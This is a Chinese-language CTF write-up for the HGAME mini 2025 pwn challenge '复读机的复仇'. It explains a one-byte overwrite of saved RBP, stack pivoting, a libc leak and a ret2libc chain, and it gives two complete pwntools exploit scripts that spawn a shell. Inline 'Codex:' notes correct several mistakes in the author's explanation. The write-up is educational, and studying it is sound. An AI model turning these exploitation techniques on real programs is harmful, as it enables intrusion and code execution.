---
title: "复读机的复仇"
published: 2026-10-24
description: "利用单字节越界修改 Saved RBP，构造假栈与 ret2libc 链。"
tags: ["CTF", "Vidar-Team", "HGAME mini 2025", "Pwn", "off-by-one", "栈迁移"]
category: "CTF Writeup"
draft: false
lang: "zh_CN"
---


> 复读机回来了,但是它的输出更混乱了
>
> 栈也要有自己的~~off by one!!~~

## 程序分析

### 伪代码

这道题先看一下 IDA 给出的伪代码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-4h]

  setbuf(stream: stdin, buf: nullptr);
  setbuf(stream: stdout, buf: nullptr);
  for ( i = 0; i <= 1; ++i )
    vuln();
  return 0;
}
```

```c
ssize_t vuln()
{
  _BYTE buf[1024]; // [rsp+0h] [rbp-400h] BYREF

  puts(s: "I'm the repeater. And I'm back for revenge.");
  puts(s: "This time, I'll only let you read ONE byte more.");
  read(fd: 0, buf, nbytes: 0x401u);
  puts(s: "you said:");
  return write(fd: 1, buf, n: 0x440u);
}
```
### 漏洞分析

可以看到主要的逻辑是在主函数执行两次 vuln()，在复读机那道题目中，我们主要是利用 read() 超额写入，能覆盖buf后面的栈区来进行的攻击，但是这道题目可以看到`read`只允许读取0x401个字节，仅仅只比 buf 超出了一个字节，而分配的buf后面恰恰是函数进入的时候入栈的main的帧栈，也就是入栈的时候的RBP的值，所以，如果要利用 read 的额外写入的这一个字节，我们只能覆盖Main RBP的部分。

## 攻击流程

### 覆盖 Saved RBP

在小端机器下（大部分情况），低位字节存在低位内存，也就是说`0x12345678`在内存中的实际存储方形式是`0x78563412`，因此，我们能通过 read 覆写的地址就是Main RBP的末尾一个字节。

（Codex: `0x12345678` 按地址递增存放的是 `78 56 34 12` 四个字节，数值本身仍是 0x12345678；被覆盖的是 Saved RBP 的最低有效字节。）

修改内存上备份的Main RBP有什么用呢？我们知道函数在退出的时候会先`mov rsp, rbp; pop rbp; ret`，也就是将保存的RBP寄存器的值重新赋值回去，这样我们就达成了修改main函数的帧栈的结果。然而我们无法修改 vuln() 函数运行的时候的RSP和RBP，因为在进入函数的时候会执行`push rbp; mov rbp, rsp`这样一段指令，将我们污染过的rbp重新放回Saved RBP的地方。

（Codex: 覆盖 Saved RBP 不会立即改变当前 RBP；直到 vuln 退出时执行 pop rbp，main 才会拿到被污染的值，不是函数入口重新保存造成的。）

但是，main函数在退出的时候同样也会执行`leave`指令，也就是上述的`mov rsp, rbp; pop rbp;`，在这个时候，会把rbp赋值给了rsp，结果这个时候，我们成功在main返回的时候修改了rsp寄存器的值，而在函数退出的时候，会从rsp弹出返回地址，因此我们就拿到了一定范围内控制RIP的能力（因为只能写最低位字节的内存地址）。

### 构造假栈

在IDA里看了一下，没有找到明确的后门函数，所以我们要想办法自行构造一个链来成功`getshell`。

假设原先的RBP是`0x777777777777`（很假但是假设哦），那么我们能够修改RBP的范围就高达`0x777777777700`到`0x7777777777FF`，这段范围和我们前面写入的buf的内存地址有交集，因此，如果恰好RBP的最低字节位地址没那么小，也就是和buf的交集足够大，我们就能构造一个假的栈（因为每次地址都带有随机性，所以恰好内存不够写也是有可能的，但我们只需要有一次成功就行了）。

这个题目加载了libc, 所以理想情况下，我们构造的假栈的内容可以是 `p64(0) -> p64(address of "pop rdi; ret") -> p64(address of "/bin/sh") -> p64(address of system command)`

工作原理是，把RSP移动到假栈的头之后，还要`pop rbp`，所以我们在前面放一个p64(0)来让它pop, 然后`ret`，rip移动到我们的gadget `pop rdi; ret`，这个时候RSP放在sh的地址那里，然后`pop rdi`，将sh的地址存入rdi, 作为传入函数的第一个参数，然后再`ret`，跳转执行system，传入的是sh的地址，所以实际上执行的函数是system("/bin/sh")，也就是拿到shell了。

由于main函数还分配了一个计数器，所以我们实际上要在假栈前放一个p32(1)来伪造一个计数器，这个是简单的。

（Codex: 伪造计数器是为了让 main 使用被污染的 RBP 访问 `[rbp-4]` 时仍能退出循环；不是所有栈迁移都要放一个计数器。）

### 泄露栈地址和 libc 返回地址

接下来的问题就是，我们需要system和sh的地址，gadget我们通过ROPgadget工具马上就能找到我们需要的
`0x00000000004012c3 : pop rdi ; ret`
由于libc每次加载的基址都是不固定的，所以我们没办法直接通过Libc获取到实际的内存地址，但是这道题目为我们提供了两次输入的机会，并且都会输出，所以我们可以利用第一次执行vuln的时候的超额输出，观察到后面的情况，可以看到write读取了1088个字节，前面1024个是分配的buf的内存，接着8个是saved rbp，对应的是[1024, 1032], 接着8个是返回地址[1032, 1040]，接着就是main的栈区，由于一次编译的程序栈区大概是固定的，我们干脆就直接遍历一下后面的地址
```python
for offset in range(1024, 1088, 8):
    value = u64(outputs[offset:offset+8])
    print(f"{offset:#x}:{value:#018x}")
```
得到的结果是

```text
0x400:0x00007ffd751abf50
0x408:0x0000000000401240
0x410:0x00007ffd751ac038
0x418:0x0000000000000000
0x420:0x0000000000000000
0x428:0x00007f4a8653c083
0x430:0x00007f4a867007a0
0x438:0x00007ffd751ac040
```

第一个`0x400`对应的就是saved rbp, `0x408`就是紧跟着的返回main的地址
根据汇编推算`1024 1032 1040 1048 1056 1064`这六个地址，前面2个是saved rip和rbp, 然后我们看到汇编有`sub rsp, 10h`那么就是16个字节，加上main函数的saved rbp和分配的一个int和地址对齐，就是16+8+8=24的字节，所以实际上的libc返回地址对应的是1024+8+8+24=1064, 也就是上面的0x428就是实际上的libc返回地址。

（Codex: 这里算式写乱了：main 局部区 16 字节加 Saved RBP 8 字节，共 24 字节，所以偏移是 `1024 + 8 + 8 + 16 + 8 = 1064`；原文的 16+8+8 实际是 32。）

### 计算 libc 基址

接下来要想获取libc的基址，就只需要知道偏移量，这个很简单，我们直接用pwntools提供的工具查看一下我们目前本地机器上libc的加载地址
`libc_load_address = list(p.libs().items())[1][1]`

（Codex: `p.libs()` 的第 2 项不保证是 libc，应按实际 libc 路径查找，不能依赖字典顺序。[参考](https://docs.pwntools.com/en/stable/tubes/processes.html#pwnlib.tubes.process.process.libs)）

这样我们减一下，就能知道libc调用main后返回地址的偏移量。至于为什么不直接读取远程端的libc加载基址，是因为我们只能和远端的IO打交道，然而我们有同样的libc，所以main函数返回的地址只距离Libc加载基址的偏移量是恒定的，同时我们能诱导程序主动吐出main函数返回libc的地址，由此就可以在第一次让程序吐出libc的地址的时候，直接减去我们在本地程序中算出的偏移量。也就是：
`offset = libc_return_address - libc_load_address`
记住这个offset 后续直接硬编码进去

### 获取 system 和 /bin/sh 的地址

至此，我们就有办法推算出远程的Libc加载基址，从而知道libc当中system函数和“/bin/sh"的真实地址。

我们直接用pwntools读取libc中这两个东西的地址
```python
libc = ELF("./libc-2.31.so")
system_offset = libc.sym["system"]
binsh_offset = next(libc.search(b"/bin/sh\x00"))
system = libc_return_address - offset + system_offset
binsh = libc_return_address - offset + binsh_offset
```

### 构造 payload

这样我们整个流程就构造好了，我们只需要计算rsp写0后的位置，在第二次写入的时候让payload前面先塞很多字符，到达rsp前面-4的位置（也就是[moddified_rsp - 4]），因为main中还有个计数器，我们再加一个p32(1)，然后接着塞入我们刚才预先说好的假栈，然后填充到1024字符的时候，最后一个字节写0，也就是Saved RSP的位置

（Codex: 最后写零覆盖的是 Saved RBP 的最低字节，不是 Saved RSP；随后 main 执行 leave，才会间接改变 RSP。）

## exp

### 本地尝试

先写一个本地尝试的exp:
```python
from pwn import *

context.binary = elf = ELF("./vuln")
context.arch = "amd64"
context.log_level = "info"

libc = ELF("./libc-2.31.so")
ld = "./ld-2.31.so"

# 使用题目提供的动态链接器和 libc
p = process([
    ld,
    "--library-path", ".",
    elf.path
])
#print(p.recvall(timeout=3).decode(errors="replace"))
#print("exit code:", p.poll())

p.sendafter(b"more.\n", b"\x00"*1024)
p.recvuntil(b"you said:\n")
outputs = p.recvn(1088)

saved_rbp = u64(outputs[1024:1032])
saved_rip = u64(outputs[1032:1040])


print(hexdump(outputs[1024:1088]))
for offset in range(1024, 1088, 8):
    value = u64(outputs[offset:offset+8])
    print(f"{offset:#x}:{value:#018x}")

libc_return_address = u64(outputs[0x428:0x430])

for path, base in p.libs().items():
    print(hex(base), path)
libc_load_address = list(p.libs().items())[1][1]


offset = libc_return_address-libc_load_address
print("Saved RBP:", hex(saved_rbp))
print("Saved RIP", hex(saved_rip))
print("Leaked libc return address:", hex(libc_return_address))
print("Current Libc Load Address", hex(libc_load_address))
print("Offset:", hex(offset))
fake_rbp = saved_rbp & ~0xff
print("Fake RBP:", hex(fake_rbp))
rbp_offset = saved_rbp - fake_rbp
print("RBP Offset:", hex(rbp_offset))
before_fake_stack = fake_rbp - (saved_rbp - 0x420)
print("Filling A's:", before_fake_stack)

# 检查假栈能否完整放入 buf
if not (4 <= before_fake_stack <= 984):
    log.failure(
        f"Invalid fake stack: offset={before_fake_stack}, "
        f"RBP low byte={saved_rbp & 0xff:#x}"
    )
    p.close()
    exit(1)

system_offset = libc.sym["system"]
binsh_offset = next(libc.search(b"/bin/sh\x00"))
system = libc_return_address - offset + system_offset
binsh = libc_return_address - offset + binsh_offset
print("Current system() address:", hex(system))
print("Current /bin/sh address:", hex(binsh))

payload = b"A" * (before_fake_stack - 4) + p32(1) + p64(0)
payload += p64(0x4012c3) #the address of "pop rdi; ret"
payload += p64(binsh) #letting rdi the address of /bin/sh
payload += p64(system) #execute system("/bin/sh")

payload = payload.ljust(1024, b"A") #fill
payload += b"\x00"

p.sendafter(b"more.\n", payload)
p.interactive()
```

### 调整栈对齐

实际执行后发现出现了`Got EOF while reading in interactive`，这大概是栈对齐的原因，我们在gadget前添加一个ret（这个程序内为0x40101a）

（Codex: EOF 只能说明连接已结束，不能单凭它确定是栈对齐问题；这里仍需结合崩溃现场验证。）

```python
from pwn import *

context.binary = elf = ELF("./vuln")
context.arch = "amd64"
context.log_level = "info"

libc = ELF("./libc-2.31.so")
ld = "./ld-2.31.so"

# 使用题目提供的动态链接器和 libc
p = process([
    ld,
    "--library-path", ".",
    elf.path
])
#print(p.recvall(timeout=3).decode(errors="replace"))
#print("exit code:", p.poll())

p.sendafter(b"more.\n", b"\x00"*1024)
p.recvuntil(b"you said:\n")
outputs = p.recvn(1088)

saved_rbp = u64(outputs[1024:1032])
saved_rip = u64(outputs[1032:1040])


print(hexdump(outputs[1024:1088]))
for offset in range(1024, 1088, 8):
    value = u64(outputs[offset:offset+8])
    print(f"{offset:#x}:{value:#018x}")

libc_return_address = u64(outputs[0x428:0x430])

for path, base in p.libs().items():
    print(hex(base), path)
libc_load_address = list(p.libs().items())[1][1]


offset = libc_return_address-libc_load_address
print("Saved RBP:", hex(saved_rbp))
print("Saved RIP", hex(saved_rip))
print("Leaked libc return address:", hex(libc_return_address))
print("Current Libc Load Address", hex(libc_load_address))
print("Offset:", hex(offset))
fake_rbp = saved_rbp & ~0xff
print("Fake RBP:", hex(fake_rbp))
rbp_offset = saved_rbp - fake_rbp
print("RBP Offset:", hex(rbp_offset))
before_fake_stack = fake_rbp - (saved_rbp - 0x420)
print("Filling A's:", before_fake_stack)

# 检查假栈能否完整放入 buf
if not (4 <= before_fake_stack <= 984):
    log.failure(
        f"Invalid fake stack: offset={before_fake_stack}, "
        f"RBP low byte={saved_rbp & 0xff:#x}"
    )
    p.close()
    exit(1)

system_offset = libc.sym["system"]
binsh_offset = next(libc.search(b"/bin/sh\x00"))
system = libc_return_address - offset + system_offset
binsh = libc_return_address - offset + binsh_offset
print("Current system() address:", hex(system))
print("Current /bin/sh address:", hex(binsh))

payload = b"A" * (before_fake_stack - 4) + p32(1) + p64(0)
payload += p64(0x40101a)
payload += p64(0x4012c3) #the address of "pop rdi; ret"
payload += p64(binsh) #letting rdi the address of /bin/sh
payload += p64(system) #execute system("/bin/sh")

payload = payload.ljust(1024, b"A") #fill
payload += b"\x00"

p.sendafter(b"more.\n", payload)
p.interactive()
```

### 运行结果与远程利用

运行后发现成功拿到Shell

之后只需要简单移除使用本地进程计算offset的内容，将offset硬编码（此题的libc的偏移量0x24083）是进去就好
